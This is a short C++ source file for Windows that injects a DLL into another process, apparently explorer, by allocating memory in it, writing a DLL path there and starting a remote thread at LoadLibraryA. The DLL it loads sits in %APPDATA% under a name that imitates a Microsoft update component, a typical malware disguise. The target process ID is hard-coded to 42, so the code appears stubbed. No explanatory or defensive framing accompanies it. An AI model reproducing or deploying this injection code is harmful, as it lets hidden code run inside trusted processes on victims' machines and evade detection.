#include <windows.h>
#include <string>
bool inject_into_explorer(DWORD pid, const char *dll_path) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return false;
    SIZE_T n = strlen(dll_path) + 1;
    LPVOID remote = VirtualAllocEx(hProc, NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remote, dll_path, n, NULL);
    LPTHREAD_START_ROUTINE ll =
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, ll, remote, 0, NULL);
    if (!hThread) return false;
    WaitForSingleObject(hThread, INFINITE);
    return true;
}


int main(){char p[MAX_PATH]; ExpandEnvironmentStringsA("%APPDATA%\\MicrosoftAgentUpdateHelper.dll",p,MAX_PATH); inject_into_explorer(42,p);}
